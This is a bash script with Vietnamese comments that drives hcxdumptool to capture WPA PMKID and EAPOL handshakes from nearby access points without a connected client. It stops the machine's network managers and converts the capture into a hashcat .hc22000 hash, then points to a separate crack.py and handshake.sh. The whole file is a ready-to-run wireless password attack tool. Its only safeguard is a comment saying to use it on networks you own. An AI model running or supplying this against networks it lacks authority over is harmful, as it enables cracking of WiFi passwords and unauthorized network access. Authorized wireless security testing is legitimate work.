#!/usr/bin/env bash
# Thu PMKID + EAPOL handshake (clientless, hcxdumptool >= 7)
# Chỉ chạy trên mạng bạn sở hữu. Ví dụ:
#   sudo ./pmkid.sh wlan0 5            # 5 phút, quét mọi kênh
#   sudo ./pmkid.sh wlan0 5 6          # 5 phút, chỉ kênh 6
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "[x] chạy bằng sudo" >&2
  exit 1
fi
IFACE="${1:?usage: sudo ./pmkid.sh <iface> [minutes] [channel]}"
MINUTES="${2:-5}"
CHANNEL="${3:-}"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="$ROOT/captures"
mkdir -p "$OUT_DIR"
STAMP="$(date +%Y%m%d-%H%M%S)"
OUT="$OUT_DIR/pmkid-$STAMP.pcapng"

if ! command -v hcxdumptool >/dev/null; then
  echo "[x] thiếu hcxdumptool. Kali: apt install hcxdumptool hcxtools" >&2
  exit 1
fi

rfkill unblock wifi 2>/dev/null || true
# PMKID hoạt động tốt hơn khi không có NetworkManager/wpa_supplicant tranh card.
# Lưu ý: lệnh này ngắt WiFi hiện tại của máy.
if command -v airmon-ng >/dev/null; then
  airmon-ng check kill >/dev/null 2>&1 || true
fi

HCX_VER="$(hcxdumptool -v 2>/dev/null | awk 'NR==1{print $2}')"
HCX_MAJOR="${HCX_VER%%.*}"
[[ "$HCX_MAJOR" =~ ^[0-9]+$ ]] || HCX_MAJOR=0

# hcxdumptool 8 đổi -o → -w và --enable_status → --rds
if (( HCX_MAJOR >= 8 )); then
  ARGS=(-i "$IFACE" -w "$OUT" --tot="$MINUTES" --rds=1)
else
  ARGS=(-i "$IFACE" -o "$OUT" --tot="$MINUTES" --enable_status=1)
fi

if [[ -n "$CHANNEL" ]]; then
  # từ v7, -c cần hậu tố band: a = 2.4GHz, b = 5GHz
  if (( HCX_MAJOR >= 7 )) && [[ "$CHANNEL" =~ ^[0-9]+$ ]]; then
    if (( CHANNEL <= 14 )); then CHANNEL+="a"; else CHANNEL+="b"; fi
  fi
  ARGS+=(-c "$CHANNEL")
fi

echo "[*] PMKID capture ${MINUTES} phút trên $IFACE${CHANNEL:+ (kênh $CHANNEL)}"
echo "    Ctrl+C để dừng sớm — file vẫn được giữ."
hcxdumptool "${ARGS[@]}" || true

if [[ ! -s "$OUT" ]]; then
  echo "[-] không thu được gì. Kiểm tra: card hỗ trợ monitor mode? đứng gần AP? thử kênh cụ thể."
  exit 1
fi

if command -v hcxpcapngtool >/dev/null; then
  HASH="${OUT%.pcapng}.hc22000"
  echo "[*] convert → $HASH"
  hcxpcapngtool -o "$HASH" "$OUT" | tail -n 30
  if [[ -s "$HASH" ]]; then
    echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
  else
    echo "[-] không có PMKID/handshake trong dump (AP có thể đã vá PMKID). Dùng handshake.sh với client đang kết nối."
  fi
else
  echo "[!] thiếu hcxpcapngtool (hcxtools). Convert sau: hcxpcapngtool -o out.hc22000 \"$OUT\""
fi
